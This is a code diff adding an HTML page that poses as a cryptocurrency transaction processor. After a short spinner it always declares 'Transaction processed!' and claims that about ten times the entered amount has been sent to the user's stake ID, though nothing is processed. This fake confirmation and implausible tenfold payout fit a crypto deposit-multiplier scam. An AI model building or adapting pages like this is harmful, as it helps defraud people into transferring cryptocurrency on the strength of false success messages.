@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Processing Transaction</title>
+  <link rel="stylesheet" href="styles/style.css">
+  <style>
+    .processing-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      background: linear-gradient(135deg, #0f172a 60%, #1e293b 100%);
+    }
+    .processing-card {
+      background: rgba(30, 41, 59, 0.97);
+      border-radius: 24px;
+      padding: 40px 32px;
+      box-shadow: 0 8px 32px 0 rgba(0,0,0,0.35);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-width: 320px;
+      max-width: 90vw;
+    }
+    .spinner {
+      border: 5px solid #334155;
+      border-top: 5px solid #22c55e;
+      border-radius: 50%;
+      width: 56px;
+      height: 56px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 28px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .processing-message, .final-message {
+      color: #e0e7ef;
+      font-size: 1.2rem;
+      text-align: center;
+      margin-bottom: 18px;
+      font-family: 'Inter', 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+    }
+    .final-message {
+      color: #22c55e;
+      font-size: 1.25rem;
+      font-weight: 600;
+      margin-top: 10px;
+    }
+    .amount-message {
+      color: #38bdf8;
+      font-size: 1.1rem;
+      margin-top: 18px;
+      font-family: 'Inter', 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div class="processing-container">
+    <div class="processing-card">
+      <div class="spinner" id="spinner"></div>
+      <div class="processing-message" id="processingMsg">Transaction being processed...</div>
+      <div class="final-message" id="finalMsg" style="display:none;"></div>
+      <div class="amount-message" id="amountMsg" style="display:none;"></div>
+    </div>
+  </div>
+  <script>
+    // Get params from URL
+    function getQueryParam(name) {
+      const url = new URL(window.location.href);
+      return url.searchParams.get(name);
+    }
+    const amount = getQueryParam('amount');
+    const crypto = getQueryParam('crypto');
+    const stakeid = getQueryParam('stakeid');
+    setTimeout(() => {
+      document.getElementById('spinner').style.display = 'none';
+      document.getElementById('processingMsg').textContent = 'Okayy! In 4-5 min balance will reflect in your stake id if you have transferred.';
+      document.getElementById('finalMsg').style.display = 'block';
+      document.getElementById('finalMsg').textContent = 'Transaction processed!';
+      if (amount && crypto && !isNaN(amount)) {
+        const total = (parseFloat(amount) * 10.1).toFixed(2);
+        document.getElementById('amountMsg').style.display = 'block';
+        document.getElementById('amountMsg').textContent = `Okayy ${total} ${crypto} sent to your stake id${stakeid ? ' (' + stakeid + ')' : ''}`;
+      }
+    }, 3500);
+  </script>
+</body>
+</html>
